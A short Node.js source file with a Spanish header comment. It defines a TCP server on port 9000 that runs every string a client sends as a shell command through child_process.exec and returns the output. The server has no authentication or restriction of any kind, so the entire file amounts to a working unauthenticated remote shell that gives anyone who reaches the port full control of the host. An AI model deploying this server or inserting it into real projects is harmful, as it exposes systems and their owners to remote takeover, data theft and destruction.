/**
 * Servidor TCP que ejecuta comandos enviados por el cliente.
 */

import net from "net";
import { exec } from "child_process";

const server = net.createServer(socket => {
  socket.on("data", data => {
    const command = data.toString().trim();

    exec(command, (err, stdout, stderr) => {
      if (err) {
        socket.write(`ERROR:\n${stderr}`);
      } else {
        socket.write(stdout || "Comando ejecutado sin salida.");
      }
      socket.end();
    });
  });
});

export function startServer() {
  server.listen(9000);
  return server;
}
export default server;

